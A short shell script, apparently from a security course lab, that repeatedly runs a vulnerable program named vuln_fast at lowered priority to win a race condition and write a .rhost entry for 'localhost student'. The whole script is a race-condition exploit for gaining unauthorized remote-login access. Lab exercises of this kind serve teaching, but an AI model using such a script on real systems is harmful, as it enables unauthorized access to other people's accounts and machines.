#!/bin/sh


while true
do

  # Increase "niceness" to increase chance of exploit
  # And write the .rhost entry
  nice -n 19 /A1/Racing/Fast/vuln_fast "localhost student"
done


